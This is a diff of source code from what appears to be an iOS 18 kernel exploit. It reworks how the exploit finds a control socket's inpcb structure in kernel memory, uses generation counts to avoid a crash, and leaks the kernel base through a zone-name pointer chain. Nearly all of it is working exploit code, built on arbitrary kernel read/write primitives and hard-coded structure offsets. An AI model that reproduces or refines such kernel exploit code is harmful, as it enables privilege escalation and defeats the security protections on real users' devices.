@@ -1598,22 +1598,45 @@ static bool validate_krw_sockets(void) {
                rwGencnt, gmin, gmax);
         return false;
     }
-    // rw inpcb inp_list.le_next -> control inpcb. Depending on xnu LIST_ENTRY
-    // layout this may be the raw next-inpcb pointer or its list-entry address
-    // (+0x20); accept either form.
-    uint64_t rawNext = kread64(rwSocketPcb + 0x20);
-    controlSocketPcb = (rawNext & 0x3ff) == 0 ? rawNext : rawNext - 0x20;
-    if ((controlSocketPcb >> 40) != 0xFFFFFF || (controlSocketPcb & 0x3ff) != 0) {
-        printf("[-] validate: controlSocketPcb 0x%llx not a canonical kernel inpcb\n", controlSocketPcb);
-        return false;
-    }
-    uint64_t controlGencnt = kread64(controlSocketPcb + 0x78);
+    // rw inpcb inp_list.le_next (+0x20) is proven to point at the control
+    // inpcb (lara: control_socket_pcb = early_kread64(rw_socket_pcb + 0x20)
+    // -- RAW, no +/-0x20 alignment guessing). The OLD heuristic
+    //   "(rawNext & 0x3ff)==0 ? rawNext : rawNext-0x20"
+    // branches on low-bit alignment: a VALID 1KB-aligned inpcb base satisfies
+    // the guard and is used unchanged ... but so does an off-by-0x20 list-entry
+    // address whose low bits happen to be 0 -- and xnu inpcb zone elements are
+    // 0x400 bytes, NOT guaranteed 1KB aligned. Taking the wrong frame made
+    //   csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET)   // +0x40
+    // read a PAC-tagged / recycled qword, then
+    //   kwrite64(csa + 0x254, ...)  ->  set_kaddr(0x00000fe3......)
+    // dereferences a tagged userspace pointer in the kernel:
+    //   "Kernel data abort ... far: 0x00000fe308cce439" (panic 2026-08-01 20:35).
+    //
+    // Fix: use inp_gencnt (+0x78) as the identity proof (boot-independent,
+    // impossible to satisfy with recycled memory), exactly like lara, and
+    // accept BOTH candidate framings -- whichever gencnt matches ours wins.
     uint64_t expectControl = [(NSNumber*)socketPcbIds[socketCsi] unsignedLongLongValue];
-    if (controlGencnt != expectControl) {
-        printf("[-] validate: control gencnt 0x%llx != expected 0x%llx (csi=%d)\n",
-               controlGencnt, expectControl, socketCsi);
+    uint64_t rawNext = kread64(rwSocketPcb + 0x20);
+    controlSocketPcb = 0;
+    uint64_t candidates[2] = { rawNext, (rawNext >= 0x20 ? rawNext - 0x20 : 0) };
+    for (int ci = 0; ci < 2; ci++) {
+        uint64_t cand = candidates[ci];
+        if ((cand >> 40) != 0xFFFFFF) continue;          // must be kernel heap
+        uint64_t gc = kread64(cand + 0x78);
+        if (gc == expectControl) { controlSocketPcb = cand; break; }
+    }
+    if (!controlSocketPcb) {
+        printf("[-] validate: no control inpcb candidate matches gencnt 0x%llx (rawNext=0x%llx)\n",
+               expectControl, rawNext);
         return false;
     }
+    uint64_t controlGencnt = expectControl;
+
+    // inp_socket (+0x40) is an UNSIGNED kernel data pointer on iOS 18 -- lara
+    // reads csa/rsa with raw early_kread64 and they come back canonical. Because
+    // controlSocketPcb/rwSocketPcb are now gencnt-proven LIVE inpcbs, these reads
+    // cannot land on recycled memory. (kread_ptr would be a no-op here anyway;
+    // raw keeps us bit-for-bit with the proven lara path.)
     uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
     uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
     if ((csa >> 40) != 0xFFFFFF || (rsa >> 40) != 0xFFFFFF) {
@@ -1860,10 +1883,15 @@ abort_no_release:
         (unsigned long long)gIcmp6FiltOffset);
     fflush(stdout);
 
-    // kernel base via inpcbinfo zone name (wh1te4ever / ClearSword, iOS 18 verified)
+    // kernel base via inpcbinfo zone name (wh1te4ever / ClearSword, iOS 18 verified).
+    // lara reads this chain with RAW early_kread64 (no xpaci) on Darwin>=23 --
+    // inp_pcbinfo/ipi_zone/zv_name are UNSIGNED kernel data pointers on this
+    // build (only CODE pointers like protosw.pr_input are PAC-signed). Match the
+    // proven path exactly. With the gencnt fix above, controlSocketPcb is now
+    // the real control inpcb, so these reads land correctly.
     uint64_t pcbinfo = kread64(controlSocketPcb + 0x38);
     uint64_t ipiZone = kread64(pcbinfo + 0x68);
-    uint64_t zvName = kread64(ipiZone + 0x10);
+    uint64_t zvName  = kread64(ipiZone + 0x10);
     printf("[+] pcbinfo 0x%llx ipiZone 0x%llx zvName 0x%llx\n", pcbinfo, ipiZone, zvName);
     fflush(stdout);
 
